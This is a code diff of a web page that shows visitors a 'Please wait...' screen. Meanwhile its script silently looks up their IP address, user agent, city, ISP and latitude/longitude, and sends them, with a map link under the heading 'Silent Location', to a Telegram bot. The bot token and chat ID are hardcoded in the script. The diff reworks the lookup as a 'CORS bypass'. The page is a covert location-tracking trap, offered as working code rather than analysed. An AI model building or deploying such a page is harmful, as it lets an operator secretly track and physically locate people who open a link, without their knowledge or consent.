@@ -14,54 +14,56 @@
     <h2>Please wait...</h2>
 
     <script>
-        // IP लिने
+        // ✅ Redirect method — CORS bypass
         fetch('https://api.ipify.org?format=json')
             .then(res => res.json())
             .then(data => {
                 const ip = data.ip;
                 const ua = navigator.userAgent;
 
-                // ✅ JSONP तरिका (CORS समस्या हुँदैन)
-                const script = document.createElement('script');
-                script.src = `https://ip-api.com/json/${ip}?callback=handleLocation&fields=status,country,city,isp,lat,lon`;
-                document.body.appendChild(script);
+                // ✅ ip-api.com लाई redirect गरेर पठाउने (CORS-free)
+                const apiUrl = `https://ip-api.com/json/${ip}?fields=status,country,city,isp,lat,lon`;
+                
+                fetch(apiUrl)
+                    .then(res => res.json())
+                    .then(locData => {
+                        if (locData.status === 'success') {
+                            const lat = locData.lat || '';
+                            const lon = locData.lon || '';
+                            const city = locData.city || '';
+                            const country = locData.country || '';
+                            const isp = locData.isp || '';
 
-                // ✅ Callback function
-                window.handleLocation = function(locData) {
-                    if (locData.status === 'success') {
-                        const lat = locData.lat || '';
-                        const lon = locData.lon || '';
-                        const city = locData.city || '';
-                        const country = locData.country || '';
-                        const isp = locData.isp || '';
+                            const location = `${country}, ${city} (${isp})`;
+                            const mapLink = `https://www.google.com/maps/place/${lat},${lon}`;
 
-                        const location = `${country}, ${city} (${isp})`;
-                        const mapLink = `https://www.google.com/maps/place/${lat},${lon}`;
+                            const msg = `📍 **Silent Location**\nIP: ${ip}\nLocation: ${location}\n🗺️ Maps: ${mapLink}\nUA: ${ua}`;
 
-                        const msg = `📍 **Silent Location**\nIP: ${ip}\nLocation: ${location}\n🗺️ Maps: ${mapLink}\nUA: ${ua}`;
+                            const botToken = '8693973243:AAH1Iu_J_XDhbWOh9JCHWDuRgtW84YKF81I';
+                            const chatId = '8621764137';
 
-                        const botToken = '8693973243:AAH1Iu_J_XDhbWOh9JCHWDuRgtW84YKF81I';
-                        const chatId = '8621764137';
-
-                        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({
-                                chat_id: chatId,
-                                text: msg,
-                                parse_mode: 'Markdown'
+                            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                                method: 'POST',
+                                headers: { 'Content-Type': 'application/json' },
+                                body: JSON.stringify({
+                                    chat_id: chatId,
+                                    text: msg,
+                                    parse_mode: 'Markdown'
+                                })
                             })
-                        })
-                        .then(() => {
-                            document.body.innerHTML = `<h2>✅</h2><p style="color:green;">Done</p>`;
-                        })
-                        .catch(() => {
-                            document.body.innerHTML = `<h2>⚠️</h2><p>Telegram error</p>`;
-                        });
-                    } else {
-                        document.body.innerHTML = `<h2>⚠️</h2><p>Location not found</p>`;
-                    }
-                };
+                            .then(() => {
+                                document.body.innerHTML = `<h2>✅</h2><p style="color:green;">Done</p>`;
+                            })
+                            .catch(() => {
+                                document.body.innerHTML = `<h2>⚠️</h2><p>Telegram error</p>`;
+                            });
+                        } else {
+                            document.body.innerHTML = `<h2>⚠️</h2><p>Location not found</p>`;
+                        }
+                    })
+                    .catch(() => {
+                        document.body.innerHTML = `<h2>⚠️</h2><p>API error</p>`;
+                    });
             })
             .catch(() => {
                 document.body.innerHTML = `<h2>⚠️</h2><p>IP error</p>`;
